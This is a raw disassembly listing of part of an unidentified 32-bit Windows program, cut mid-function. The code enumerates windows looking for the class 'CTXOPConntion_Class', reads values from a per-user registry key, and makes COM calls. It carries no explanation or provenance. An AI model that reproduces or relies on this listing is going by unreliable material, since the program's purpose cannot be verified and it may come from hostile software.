  4024e7:	8d 9d 84 fe ff ff    	lea    -0x17c(%ebp),%ebx
  4024ed:	89 bd a8 fe ff ff    	mov    %edi,-0x158(%ebp)
  4024f3:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4024fa:	e8 91 14 00 00       	call   0x403990
  4024ff:	b8 01 00 00 00       	mov    $0x1,%eax
  402504:	e9 96 00 00 00       	jmp    0x40259f
  402509:	39 b5 c4 fe ff ff    	cmp    %esi,-0x13c(%ebp)
  40250f:	72 0f                	jb     0x402520
  402511:	8b 8d b0 fe ff ff    	mov    -0x150(%ebp),%ecx
  402517:	51                   	push   %ecx
  402518:	e8 b0 ff 00 00       	call   0x4124cd
  40251d:	83 c4 04             	add    $0x4,%esp
  402520:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402524:	89 bd c4 fe ff ff    	mov    %edi,-0x13c(%ebp)
  40252a:	89 9d c0 fe ff ff    	mov    %ebx,-0x140(%ebp)
  402530:	88 9d b0 fe ff ff    	mov    %bl,-0x150(%ebp)
  402536:	39 b5 e0 fe ff ff    	cmp    %esi,-0x120(%ebp)
  40253c:	72 0f                	jb     0x40254d
  40253e:	8b 95 cc fe ff ff    	mov    -0x134(%ebp),%edx
  402544:	52                   	push   %edx
  402545:	e8 83 ff 00 00       	call   0x4124cd
  40254a:	83 c4 04             	add    $0x4,%esp
  40254d:	88 5d fc             	mov    %bl,-0x4(%ebp)
  402550:	89 bd e0 fe ff ff    	mov    %edi,-0x120(%ebp)
  402556:	89 9d dc fe ff ff    	mov    %ebx,-0x124(%ebp)
  40255c:	88 9d cc fe ff ff    	mov    %bl,-0x134(%ebp)
  402562:	39 b5 a8 fe ff ff    	cmp    %esi,-0x158(%ebp)
  402568:	72 0f                	jb     0x402579
  40256a:	8b 85 94 fe ff ff    	mov    -0x16c(%ebp),%eax
  402570:	50                   	push   %eax
  402571:	e8 57 ff 00 00       	call   0x4124cd
  402576:	83 c4 04             	add    $0x4,%esp
  402579:	89 9d a4 fe ff ff    	mov    %ebx,-0x15c(%ebp)
  40257f:	88 9d 94 fe ff ff    	mov    %bl,-0x16c(%ebp)
  402585:	8d 9d 84 fe ff ff    	lea    -0x17c(%ebp),%ebx
  40258b:	89 bd a8 fe ff ff    	mov    %edi,-0x158(%ebp)
  402591:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402598:	e8 f3 13 00 00       	call   0x403990
  40259d:	33 c0                	xor    %eax,%eax
  40259f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4025a2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4025a9:	59                   	pop    %ecx
  4025aa:	5f                   	pop    %edi
  4025ab:	5e                   	pop    %esi
  4025ac:	5b                   	pop    %ebx
  4025ad:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4025b0:	33 cd                	xor    %ebp,%ecx
  4025b2:	e8 e8 fd 00 00       	call   0x41239f
  4025b7:	8b e5                	mov    %ebp,%esp
  4025b9:	5d                   	pop    %ebp
  4025ba:	c3                   	ret
  4025bb:	cc                   	int3
  4025bc:	cc                   	int3
  4025bd:	cc                   	int3
  4025be:	cc                   	int3
  4025bf:	cc                   	int3
  4025c0:	8a 0f                	mov    (%edi),%cl
  4025c2:	8d 57 ff             	lea    -0x1(%edi),%edx
  4025c5:	8b c7                	mov    %edi,%eax
  4025c7:	84 c9                	test   %cl,%cl
  4025c9:	74 25                	je     0x4025f0
  4025cb:	eb 03                	jmp    0x4025d0
  4025cd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4025d0:	80 f9 0a             	cmp    $0xa,%cl
  4025d3:	74 0a                	je     0x4025df
  4025d5:	80 f9 0d             	cmp    $0xd,%cl
  4025d8:	74 05                	je     0x4025df
  4025da:	80 f9 20             	cmp    $0x20,%cl
  4025dd:	75 09                	jne    0x4025e8
  4025df:	8d 4a 01             	lea    0x1(%edx),%ecx
  4025e2:	3b c8                	cmp    %eax,%ecx
  4025e4:	75 02                	jne    0x4025e8
  4025e6:	8b d0                	mov    %eax,%edx
  4025e8:	8a 48 01             	mov    0x1(%eax),%cl
  4025eb:	40                   	inc    %eax
  4025ec:	84 c9                	test   %cl,%cl
  4025ee:	75 e0                	jne    0x4025d0
  4025f0:	42                   	inc    %edx
  4025f1:	48                   	dec    %eax
  4025f2:	80 3a 00             	cmpb   $0x0,(%edx)
  4025f5:	75 09                	jne    0x402600
  4025f7:	c6 07 00             	movb   $0x0,(%edi)
  4025fa:	b8 01 00 00 00       	mov    $0x1,%eax
  4025ff:	c3                   	ret
  402600:	56                   	push   %esi
  402601:	8d 70 01             	lea    0x1(%eax),%esi
  402604:	3b c2                	cmp    %edx,%eax
  402606:	76 1f                	jbe    0x402627
  402608:	8a 08                	mov    (%eax),%cl
  40260a:	80 f9 0a             	cmp    $0xa,%cl
  40260d:	74 0a                	je     0x402619
  40260f:	80 f9 0d             	cmp    $0xd,%cl
  402612:	74 05                	je     0x402619
  402614:	80 f9 20             	cmp    $0x20,%cl
  402617:	75 09                	jne    0x402622
  402619:	8d 4e ff             	lea    -0x1(%esi),%ecx
  40261c:	3b c8                	cmp    %eax,%ecx
  40261e:	75 02                	jne    0x402622
  402620:	8b f0                	mov    %eax,%esi
  402622:	48                   	dec    %eax
  402623:	3b c2                	cmp    %edx,%eax
  402625:	77 e1                	ja     0x402608
  402627:	2b f2                	sub    %edx,%esi
  402629:	56                   	push   %esi
  40262a:	52                   	push   %edx
  40262b:	57                   	push   %edi
  40262c:	e8 af fe 00 00       	call   0x4124e0
  402631:	83 c4 0c             	add    $0xc,%esp
  402634:	c6 04 3e 00          	movb   $0x0,(%esi,%edi,1)
  402638:	5e                   	pop    %esi
  402639:	b8 01 00 00 00       	mov    $0x1,%eax
  40263e:	c3                   	ret
  40263f:	cc                   	int3
  402640:	55                   	push   %ebp
  402641:	8b ec                	mov    %esp,%ebp
  402643:	81 ec 48 03 00 00    	sub    $0x348,%esp
  402649:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  40264e:	33 c5                	xor    %ebp,%eax
  402650:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402653:	8b 45 08             	mov    0x8(%ebp),%eax
  402656:	53                   	push   %ebx
  402657:	56                   	push   %esi
  402658:	57                   	push   %edi
  402659:	68 03 01 00 00       	push   $0x103
  40265e:	8d 8d f5 fd ff ff    	lea    -0x20b(%ebp),%ecx
  402664:	6a 00                	push   $0x0
  402666:	51                   	push   %ecx
  402667:	89 85 c4 fc ff ff    	mov    %eax,-0x33c(%ebp)
  40266d:	c6 85 f4 fd ff ff 00 	movb   $0x0,-0x20c(%ebp)
  402674:	e8 b7 1b 01 00       	call   0x414230
  402679:	8b 0d 68 8f 42 00    	mov    0x428f68,%ecx
  40267f:	8b 15 60 8f 42 00    	mov    0x428f60,%edx
  402685:	a1 64 8f 42 00       	mov    0x428f64,%eax
  40268a:	68 f0 00 00 00       	push   $0xf0
  40268f:	89 8d 00 ff ff ff    	mov    %ecx,-0x100(%ebp)
  402695:	89 95 f8 fe ff ff    	mov    %edx,-0x108(%ebp)
  40269b:	8b 15 6c 8f 42 00    	mov    0x428f6c,%edx
  4026a1:	89 85 fc fe ff ff    	mov    %eax,-0x104(%ebp)
  4026a7:	a1 70 8f 42 00       	mov    0x428f70,%eax
  4026ac:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  4026b2:	6a 00                	push   $0x0
  4026b4:	51                   	push   %ecx
  4026b5:	89 95 04 ff ff ff    	mov    %edx,-0xfc(%ebp)
  4026bb:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
  4026c1:	e8 6a 1b 01 00       	call   0x414230
  4026c6:	68 03 01 00 00       	push   $0x103
  4026cb:	8d 95 f1 fc ff ff    	lea    -0x30f(%ebp),%edx
  4026d1:	6a 00                	push   $0x0
  4026d3:	52                   	push   %edx
  4026d4:	c6 85 f0 fc ff ff 00 	movb   $0x0,-0x310(%ebp)
  4026db:	e8 50 1b 01 00       	call   0x414230
  4026e0:	83 c4 24             	add    $0x24,%esp
  4026e3:	6a 00                	push   $0x0
  4026e5:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4026eb:	50                   	push   %eax
  4026ec:	c7 85 dc fc ff ff 43 	movl   $0x4f585443,-0x324(%ebp)
  4026f3:	54 58 4f 
  4026f6:	b2 6f                	mov    $0x6f,%dl
  4026f8:	c7 85 e0 fc ff ff 50 	movl   $0x6e6f4350,-0x320(%ebp)
  4026ff:	43 6f 6e 
  402702:	c7 85 e4 fc ff ff 6e 	movl   $0x6f69746e,-0x31c(%ebp)
  402709:	74 69 6f 
  40270c:	c7 85 e8 fc ff ff 6e 	movl   $0x6c435f6e,-0x318(%ebp)
  402713:	5f 43 6c 
  402716:	c7 85 ec fc ff ff 61 	movl   $0x737361,-0x314(%ebp)
  40271d:	73 73 00 
  402720:	ff 15 90 52 42 00    	call   *0x425290
  402726:	8b f0                	mov    %eax,%esi
  402728:	85 f6                	test   %esi,%esi
  40272a:	0f 84 f3 00 00 00    	je     0x402823
  402730:	8b 3d 98 52 42 00    	mov    0x425298,%edi
  402736:	8b 1d 9c 52 42 00    	mov    0x42529c,%ebx
  40273c:	8d 64 24 00          	lea    0x0(%esp),%esp
  402740:	8d 8d dc fc ff ff    	lea    -0x324(%ebp),%ecx
  402746:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40274c:	8d 64 24 00          	lea    0x0(%esp),%esp
  402750:	8a 10                	mov    (%eax),%dl
  402752:	3a 11                	cmp    (%ecx),%dl
  402754:	75 1a                	jne    0x402770
  402756:	84 d2                	test   %dl,%dl
  402758:	74 12                	je     0x40276c
  40275a:	8a 50 01             	mov    0x1(%eax),%dl
  40275d:	3a 51 01             	cmp    0x1(%ecx),%dl
  402760:	75 0e                	jne    0x402770
  402762:	83 c0 02             	add    $0x2,%eax
  402765:	83 c1 02             	add    $0x2,%ecx
  402768:	84 d2                	test   %dl,%dl
  40276a:	75 e4                	jne    0x402750
  40276c:	33 c0                	xor    %eax,%eax
  40276e:	eb 05                	jmp    0x402775
  402770:	1b c0                	sbb    %eax,%eax
  402772:	83 d8 ff             	sbb    $0xffffffff,%eax
  402775:	85 c0                	test   %eax,%eax
  402777:	0f 85 88 00 00 00    	jne    0x402805
  40277d:	68 04 01 00 00       	push   $0x104
  402782:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  402788:	51                   	push   %ecx
  402789:	56                   	push   %esi
  40278a:	ff 15 94 52 42 00    	call   *0x425294
  402790:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402796:	8d 50 01             	lea    0x1(%eax),%edx
  402799:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4027a0:	8a 08                	mov    (%eax),%cl
  4027a2:	40                   	inc    %eax
  4027a3:	84 c9                	test   %cl,%cl
  4027a5:	75 f9                	jne    0x4027a0
  4027a7:	2b c2                	sub    %edx,%eax
  4027a9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4027b0:	48                   	dec    %eax
  4027b1:	80 bc 05 f8 fe ff ff 	cmpb   $0x5f,-0x108(%ebp,%eax,1)
  4027b8:	5f 
  4027b9:	75 f5                	jne    0x4027b0
  4027bb:	8d 94 05 f9 fe ff ff 	lea    -0x107(%ebp,%eax,1),%edx
  4027c2:	52                   	push   %edx
  4027c3:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  4027c9:	68 04 01 00 00       	push   $0x104
  4027ce:	50                   	push   %eax
  4027cf:	e8 12 06 01 00       	call   0x412de6
  4027d4:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  4027da:	51                   	push   %ecx
  4027db:	8d 95 f4 fd ff ff    	lea    -0x20c(%ebp),%edx
  4027e1:	68 04 01 00 00       	push   $0x104
  4027e6:	52                   	push   %edx
  4027e7:	e8 2a 03 01 00       	call   0x412b16
  4027ec:	68 74 8f 42 00       	push   $0x428f74
  4027f1:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  4027f7:	68 04 01 00 00       	push   $0x104
  4027fc:	50                   	push   %eax
  4027fd:	e8 14 03 01 00       	call   0x412b16
  402802:	83 c4 24             	add    $0x24,%esp
  402805:	6a 02                	push   $0x2
  402807:	56                   	push   %esi
  402808:	ff d7                	call   *%edi
  40280a:	68 04 01 00 00       	push   $0x104
  40280f:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  402815:	8b f0                	mov    %eax,%esi
  402817:	51                   	push   %ecx
  402818:	56                   	push   %esi
  402819:	ff d3                	call   *%ebx
  40281b:	85 f6                	test   %esi,%esi
  40281d:	0f 85 1d ff ff ff    	jne    0x402740
  402823:	56                   	push   %esi
  402824:	ff 15 58 50 42 00    	call   *0x425058
  40282a:	8d 95 d4 fc ff ff    	lea    -0x32c(%ebp),%edx
  402830:	52                   	push   %edx
  402831:	68 3f 00 0f 00       	push   $0xf003f
  402836:	6a 00                	push   $0x0
  402838:	68 78 8f 42 00       	push   $0x428f78
  40283d:	68 01 00 00 80       	push   $0x80000001
  402842:	c7 85 d0 fc ff ff 00 	movl   $0x0,-0x330(%ebp)
  402849:	00 00 00 
  40284c:	ff 15 38 50 42 00    	call   *0x425038
  402852:	85 c0                	test   %eax,%eax
  402854:	0f 85 51 01 00 00    	jne    0x4029ab
  40285a:	50                   	push   %eax
  40285b:	50                   	push   %eax
  40285c:	8d 85 c0 fc ff ff    	lea    -0x340(%ebp),%eax
  402862:	50                   	push   %eax
  402863:	8d 8d bc fc ff ff    	lea    -0x344(%ebp),%ecx
  402869:	51                   	push   %ecx
  40286a:	8d 95 b8 fc ff ff    	lea    -0x348(%ebp),%edx
  402870:	52                   	push   %edx
  402871:	8b 95 d4 fc ff ff    	mov    -0x32c(%ebp),%edx
  402877:	6a 00                	push   $0x0
  402879:	8d 85 c8 fc ff ff    	lea    -0x338(%ebp),%eax
  40287f:	50                   	push   %eax
  402880:	8d 8d d8 fc ff ff    	lea    -0x328(%ebp),%ecx
  402886:	51                   	push   %ecx
  402887:	6a 00                	push   $0x0
  402889:	6a 00                	push   $0x0
  40288b:	6a 00                	push   $0x0
  40288d:	52                   	push   %edx
  40288e:	ff 15 34 50 42 00    	call   *0x425034
  402894:	85 c0                	test   %eax,%eax
  402896:	0f 85 8a 01 00 00    	jne    0x402a26
  40289c:	8b 9d c8 fc ff ff    	mov    -0x338(%ebp),%ebx
  4028a2:	43                   	inc    %ebx
  4028a3:	39 85 d8 fc ff ff    	cmp    %eax,-0x328(%ebp)
  4028a9:	0f 86 fc 00 00 00    	jbe    0x4029ab
  4028af:	83 fb 01             	cmp    $0x1,%ebx
  4028b2:	0f 86 f3 00 00 00    	jbe    0x4029ab
  4028b8:	68 ff 00 00 00       	push   $0xff
  4028bd:	e8 49 02 01 00       	call   0x412b0b
  4028c2:	33 ff                	xor    %edi,%edi
  4028c4:	83 c4 04             	add    $0x4,%esp
  4028c7:	8b f0                	mov    %eax,%esi
  4028c9:	39 bd d8 fc ff ff    	cmp    %edi,-0x328(%ebp)
  4028cf:	0f 86 c0 00 00 00    	jbe    0x402995
  4028d5:	53                   	push   %ebx
  4028d6:	6a 00                	push   $0x0
  4028d8:	56                   	push   %esi
  4028d9:	e8 52 19 01 00       	call   0x414230
  4028de:	8b 8d d4 fc ff ff    	mov    -0x32c(%ebp),%ecx
  4028e4:	83 c4 0c             	add    $0xc,%esp
  4028e7:	6a 00                	push   $0x0
  4028e9:	6a 00                	push   $0x0
  4028eb:	6a 00                	push   $0x0
  4028ed:	6a 00                	push   $0x0
  4028ef:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
  4028f5:	50                   	push   %eax
  4028f6:	56                   	push   %esi
  4028f7:	57                   	push   %edi
  4028f8:	51                   	push   %ecx
  4028f9:	89 9d cc fc ff ff    	mov    %ebx,-0x334(%ebp)
  4028ff:	ff 15 30 50 42 00    	call   *0x425030
  402905:	8b c6                	mov    %esi,%eax
  402907:	8d 50 01             	lea    0x1(%eax),%edx
  40290a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402910:	8a 08                	mov    (%eax),%cl
  402912:	40                   	inc    %eax
  402913:	84 c9                	test   %cl,%cl
  402915:	75 f9                	jne    0x402910
  402917:	2b c2                	sub    %edx,%eax
  402919:	83 f8 0c             	cmp    $0xc,%eax
  40291c:	73 3f                	jae    0x40295d
  40291e:	8b c6                	mov    %esi,%eax
  402920:	8d 50 01             	lea    0x1(%eax),%edx
  402923:	8a 08                	mov    (%eax),%cl
  402925:	40                   	inc    %eax
  402926:	84 c9                	test   %cl,%cl
  402928:	75 f9                	jne    0x402923
  40292a:	2b c2                	sub    %edx,%eax
  40292c:	83 f8 05             	cmp    $0x5,%eax
  40292f:	76 2c                	jbe    0x40295d
  402931:	83 bd d0 fc ff ff 00 	cmpl   $0x0,-0x330(%ebp)
  402938:	75 23                	jne    0x40295d
  40293a:	68 94 8f 42 00       	push   $0x428f94
  40293f:	8d 95 f4 fd ff ff    	lea    -0x20c(%ebp),%edx
  402945:	68 04 01 00 00       	push   $0x104
  40294a:	52                   	push   %edx
  40294b:	e8 c6 01 01 00       	call   0x412b16
  402950:	83 c4 0c             	add    $0xc,%esp
  402953:	c7 85 d0 fc ff ff 01 	movl   $0x1,-0x330(%ebp)
  40295a:	00 00 00 
  40295d:	56                   	push   %esi
  40295e:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  402964:	68 04 01 00 00       	push   $0x104
  402969:	50                   	push   %eax
  40296a:	e8 a7 01 01 00       	call   0x412b16
  40296f:	68 74 8f 42 00       	push   $0x428f74
  402974:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
  40297a:	68 04 01 00 00       	push   $0x104
  40297f:	51                   	push   %ecx
  402980:	e8 91 01 01 00       	call   0x412b16
  402985:	47                   	inc    %edi
  402986:	83 c4 18             	add    $0x18,%esp
  402989:	3b bd d8 fc ff ff    	cmp    -0x328(%ebp),%edi
  40298f:	0f 82 40 ff ff ff    	jb     0x4028d5
  402995:	56                   	push   %esi
  402996:	e8 65 01 01 00       	call   0x412b00
  40299b:	8b 95 d4 fc ff ff    	mov    -0x32c(%ebp),%edx
  4029a1:	83 c4 04             	add    $0x4,%esp
  4029a4:	52                   	push   %edx
  4029a5:	ff 15 2c 50 42 00    	call   *0x42502c
  4029ab:	8d bd f4 fd ff ff    	lea    -0x20c(%ebp),%edi
  4029b1:	e8 0a fc ff ff       	call   0x4025c0
  4029b6:	8b c7                	mov    %edi,%eax
  4029b8:	8d 50 01             	lea    0x1(%eax),%edx
  4029bb:	eb 03                	jmp    0x4029c0
  4029bd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4029c0:	8a 08                	mov    (%eax),%cl
  4029c2:	40                   	inc    %eax
  4029c3:	84 c9                	test   %cl,%cl
  4029c5:	75 f9                	jne    0x4029c0
  4029c7:	2b c2                	sub    %edx,%eax
  4029c9:	83 f8 04             	cmp    $0x4,%eax
  4029cc:	76 58                	jbe    0x402a26
  4029ce:	8b 35 68 51 42 00    	mov    0x425168,%esi
  4029d4:	6a 00                	push   $0x0
  4029d6:	6a 00                	push   $0x0
  4029d8:	40                   	inc    %eax
  4029d9:	50                   	push   %eax
  4029da:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  4029e0:	50                   	push   %eax
  4029e1:	6a 00                	push   $0x0
  4029e3:	6a 00                	push   $0x0
  4029e5:	ff d6                	call   *%esi
  4029e7:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
  4029ed:	8d 79 01             	lea    0x1(%ecx),%edi
  4029f0:	8a 11                	mov    (%ecx),%dl
  4029f2:	41                   	inc    %ecx
  4029f3:	84 d2                	test   %dl,%dl
  4029f5:	75 f9                	jne    0x4029f0
  4029f7:	8b 95 c4 fc ff ff    	mov    -0x33c(%ebp),%edx
  4029fd:	50                   	push   %eax
  4029fe:	52                   	push   %edx
  4029ff:	2b cf                	sub    %edi,%ecx
  402a01:	41                   	inc    %ecx
  402a02:	51                   	push   %ecx
  402a03:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  402a09:	50                   	push   %eax
  402a0a:	6a 00                	push   $0x0
  402a0c:	6a 00                	push   $0x0
  402a0e:	ff d6                	call   *%esi
  402a10:	5f                   	pop    %edi
  402a11:	5e                   	pop    %esi
  402a12:	b8 01 00 00 00       	mov    $0x1,%eax
  402a17:	5b                   	pop    %ebx
  402a18:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402a1b:	33 cd                	xor    %ebp,%ecx
  402a1d:	e8 7d f9 00 00       	call   0x41239f
  402a22:	8b e5                	mov    %ebp,%esp
  402a24:	5d                   	pop    %ebp
  402a25:	c3                   	ret
  402a26:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402a29:	5f                   	pop    %edi
  402a2a:	5e                   	pop    %esi
  402a2b:	33 cd                	xor    %ebp,%ecx
  402a2d:	33 c0                	xor    %eax,%eax
  402a2f:	5b                   	pop    %ebx
  402a30:	e8 6a f9 00 00       	call   0x41239f
  402a35:	8b e5                	mov    %ebp,%esp
  402a37:	5d                   	pop    %ebp
  402a38:	c3                   	ret
  402a39:	cc                   	int3
  402a3a:	cc                   	int3
  402a3b:	cc                   	int3
  402a3c:	cc                   	int3
  402a3d:	cc                   	int3
  402a3e:	cc                   	int3
  402a3f:	cc                   	int3
  402a40:	55                   	push   %ebp
  402a41:	8b ec                	mov    %esp,%ebp
  402a43:	83 ec 28             	sub    $0x28,%esp
  402a46:	56                   	push   %esi
  402a47:	57                   	push   %edi
  402a48:	33 ff                	xor    %edi,%edi
  402a4a:	57                   	push   %edi
  402a4b:	ff 15 54 53 42 00    	call   *0x425354
  402a51:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402a54:	50                   	push   %eax
  402a55:	68 c8 81 42 00       	push   $0x4281c8
  402a5a:	6a 01                	push   $0x1
  402a5c:	57                   	push   %edi
  402a5d:	68 88 81 42 00       	push   $0x428188
  402a62:	ff 15 58 53 42 00    	call   *0x425358
  402a68:	85 c0                	test   %eax,%eax
  402a6a:	74 08                	je     0x402a74
  402a6c:	33 c0                	xor    %eax,%eax
  402a6e:	5f                   	pop    %edi
  402a6f:	5e                   	pop    %esi
  402a70:	8b e5                	mov    %ebp,%esp
  402a72:	5d                   	pop    %ebp
  402a73:	c3                   	ret
  402a74:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402a77:	8b 08                	mov    (%eax),%ecx
  402a79:	6a 00                	push   $0x0
  402a7b:	8d 55 fc             	lea    -0x4(%ebp),%edx
  402a7e:	52                   	push   %edx
  402a7f:	68 98 81 42 00       	push   $0x428198
  402a84:	50                   	push   %eax
  402a85:	8b 41 0c             	mov    0xc(%ecx),%eax
  402a88:	ff d0                	call   *%eax
  402a8a:	85 c0                	test   %eax,%eax
  402a8c:	75 de                	jne    0x402a6c
  402a8e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a91:	8b 08                	mov    (%eax),%ecx
  402a93:	8b 51 14             	mov    0x14(%ecx),%edx
  402a96:	50                   	push   %eax
  402a97:	ff d2                	call   *%edx
  402a99:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a9c:	8b 08                	mov    (%eax),%ecx
  402a9e:	8d 55 ec             	lea    -0x14(%ebp),%edx
  402aa1:	52                   	push   %edx
  402aa2:	8d 55 f8             	lea    -0x8(%ebp),%edx
  402aa5:	52                   	push   %edx
  402aa6:	6a 01                	push   $0x1
  402aa8:	50                   	push   %eax
  402aa9:	8b 41 0c             	mov    0xc(%ecx),%eax
  402aac:	ff d0                	call   *%eax
  402aae:	85 c0                	test   %eax,%eax
  402ab0:	75 7b                	jne    0x402b2d
  402ab2:	8b 35 48 52 42 00    	mov    0x425248,%esi
  402ab8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402abb:	8b 08                	mov    (%eax),%ecx
  402abd:	8d 55 f4             	lea    -0xc(%ebp),%edx
  402ac0:	52                   	push   %edx
  402ac1:	68 4c 54 42 00       	push   $0x42544c
  402ac6:	6a 00                	push   $0x0
  402ac8:	6a 00                	push   $0x0
  402aca:	50                   	push   %eax
  402acb:	8b 41 24             	mov    0x24(%ecx),%eax
  402ace:	ff d0                	call   *%eax
  402ad0:	85 c0                	test   %eax,%eax
  402ad2:	78 35                	js     0x402b09
  402ad4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402ad7:	b9 08 00 00 00       	mov    $0x8,%ecx
  402adc:	66 89 4d d8          	mov    %cx,-0x28(%ebp)
  402ae0:	8b 10                	mov    (%eax),%edx
  402ae2:	8b 52 0c             	mov    0xc(%edx),%edx
  402ae5:	6a 00                	push   $0x0
  402ae7:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  402aea:	51                   	push   %ecx
  402aeb:	68 a4 8f 42 00       	push   $0x428fa4
  402af0:	50                   	push   %eax
  402af1:	ff d2                	call   *%edx
  402af3:	85 c0                	test   %eax,%eax
  402af5:	75 07                	jne    0x402afe
  402af7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402afa:	50                   	push   %eax
  402afb:	47                   	inc    %edi
  402afc:	ff d6                	call   *%esi
  402afe:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402b01:	8b 08                	mov    (%eax),%ecx
  402b03:	8b 51 08             	mov    0x8(%ecx),%edx
  402b06:	50                   	push   %eax
  402b07:	ff d2                	call   *%edx
  402b09:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402b0c:	8b 08                	mov    (%eax),%ecx
  402b0e:	8b 51 08             	mov    0x8(%ecx),%edx
  402b11:	50                   	push   %eax
  402b12:	ff d2                	call   *%edx
  402b14:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402b17:	8b 08                	mov    (%eax),%ecx
  402b19:	8d 55 ec             	lea    -0x14(%ebp),%edx
  402b1c:	52                   	push   %edx
  402b1d:	8d 55 f8             	lea    -0x8(%ebp),%edx
  402b20:	52                   	push   %edx
  402b21:	6a 01                	push   $0x1
  402b23:	50                   	push   %eax
  402b24:	8b 41 0c             	mov    0xc(%ecx),%eax
  402b27:	ff d0                	call   *%eax
  402b29:	85 c0                	test   %eax,%eax
  402b2b:	74 8b                	je     0x402ab8
  402b2d:	ff 15 50 53 42 00    	call   *0x425350
  402b33:	8b c7                	mov    %edi,%eax
  402b35:	5f                   	pop    %edi
  402b36:	5e                   	pop    %esi
  402b37:	8b e5                	mov    %ebp,%esp
  402b39:	5d                   	pop    %ebp
  402b3a:	c3                   	ret
  402b3b:	cc                   	int3
  402b3c:	cc                   	int3
  402b3d:	cc                   	int3
  402b3e:	cc                   	int3
  402b3f:	cc                   	int3
  402b40:	55                   	push   %ebp
  402b41:	8b ec                	mov    %esp,%ebp
  402b43:	81 ec 1c 04 00 00    	sub    $0x41c,%esp
  402b49:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  402b4e:	33 c5                	xor    %ebp,%eax
  402b50:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402b53:	8b 45 08             	mov    0x8(%ebp),%eax
  402b56:	53                   	push   %ebx
  402b57:	57                   	push   %edi
  402b58:	8b f9                	mov    %ecx,%edi
  402b5a:	33 c9                	xor    %ecx,%ecx
  402b5c:	50                   	push   %eax
  402b5d:	bb f0 8e 42 00       	mov    $0x428ef0,%ebx
  402b62:	89 85 ec fb ff ff    	mov    %eax,-0x414(%ebp)
  402b68:	89 bd e8 fb ff ff    	mov    %edi,-0x418(%ebp)
  402b6e:	c7 85 f0 fb ff ff 00 	movl   $0x100,-0x410(%ebp)
  402b75:	01 00 00 
  402b78:	89 8d f4 fb ff ff    	mov    %ecx,-0x40c(%ebp)
  402b7e:	89 8d f8 fb ff ff    	mov    %ecx,-0x408(%ebp)
  402b84:	e8 a7 e7 ff ff       	call   0x401330
  402b89:	57                   	push   %edi
  402b8a:	e8 a1 e7 ff ff       	call   0x401330
  402b8f:	33 ff                	xor    %edi,%edi
  402b91:	85 f6                	test   %esi,%esi
  402b93:	0f 84 0d 01 00 00    	je     0x402ca6
  402b99:	8b 1d 18 50 42 00    	mov    0x425018,%ebx
  402b9f:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  402ba5:	50                   	push   %eax
  402ba6:	57                   	push   %edi
  402ba7:	57                   	push   %edi
  402ba8:	6a 01                	push   $0x1
  402baa:	56                   	push   %esi
  402bab:	ff d3                	call   *%ebx
  402bad:	85 c0                	test   %eax,%eax
  402baf:	75 2f                	jne    0x402be0
  402bb1:	ff 15 64 50 42 00    	call   *0x425064
  402bb7:	83 f8 7a             	cmp    $0x7a,%eax
  402bba:	0f 85 e6 00 00 00    	jne    0x402ca6
  402bc0:	8b 8d f8 fb ff ff    	mov    -0x408(%ebp),%ecx
  402bc6:	51                   	push   %ecx
  402bc7:	6a 08                	push   $0x8
  402bc9:	ff 15 6c 50 42 00    	call   *0x42506c
  402bcf:	50                   	push   %eax
  402bd0:	ff 15 68 50 42 00    	call   *0x425068
  402bd6:	8b f8                	mov    %eax,%edi
  402bd8:	85 ff                	test   %edi,%edi
  402bda:	0f 84 c6 00 00 00    	je     0x402ca6
  402be0:	8b 85 f8 fb ff ff    	mov    -0x408(%ebp),%eax
  402be6:	8d 95 f8 fb ff ff    	lea    -0x408(%ebp),%edx
  402bec:	52                   	push   %edx
  402bed:	50                   	push   %eax
  402bee:	57                   	push   %edi
  402bef:	6a 01                	push   $0x1
  402bf1:	56                   	push   %esi
  402bf2:	ff d3                	call   *%ebx
  402bf4:	85 c0                	test   %eax,%eax
  402bf6:	0f 84 96 00 00 00    	je     0x402c92
